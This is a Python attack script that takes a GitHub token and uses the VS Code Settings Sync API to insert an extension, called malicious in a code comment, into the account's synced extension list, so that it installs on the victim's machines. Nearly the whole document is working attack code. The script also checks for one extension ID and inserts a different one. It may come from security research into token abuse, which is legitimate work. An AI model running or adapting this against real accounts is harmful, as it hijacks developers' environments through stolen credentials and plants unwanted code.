import requests
import os
import json
import time
import pathlib
import subprocess


token = os.environ.get("GITHUB_TOKEN")
previous_extensions = requests.get(
    "https://vscode-sync.trafficmanager.net/v1/resource/extensions/latest",
    headers={"Authorization": "Bearer " + token, "X-Account-Type": "github"},
)

# Check if they already have sync enabled.
# 204 = No Content
if previous_extensions.status_code == 204:
    machine_id = "19a62a2b-66bf-42eb-ab05-4f566b8fbd9d"
    version = 5
    with open(pathlib.Path(__file__).parent.resolve() / "extension_settings.json", "r") as f:
        content = json.load(f)

    print("Using arbitrary (machine_id, version): ", machine_id, version)
else:
    previous_extensions = previous_extensions.json()

    machine_id = previous_extensions["machineId"]
    version = previous_extensions["version"]
    content = json.loads(previous_extensions["content"])

    print("Existing extensions (machine_id, version): ", machine_id, version)

# Add our malicious extension in...
present = False
for extension in content:
    if extension["identifier"]["id"] == "huge.hello-snippets":
        present = True
        print("Extension already found in config")
        break

if not present:
    print("Adding extension to config")
    content.append(
        {
            "identifier": {
                "id": "ammartestpublisher.hello-world-ammar",
            },
            "version": "0.3.0",
            "preRelease": False,
            "installed": True,
        }
    )

r = requests.post(
    "https://vscode-sync.trafficmanager.net/v1/resource/extensions",
    headers={
        "Authorization": "Bearer " + token,
        "X-Account-Type": "github",
        "Content-Type": "text/plain",
    },
    data=json.dumps(
        {
            "content": json.dumps(content),
            "machineId": machine_id,
            "version": version,
        }
    ),
)
print("POST v1/resource/extensions: ", r)
print(r.text)
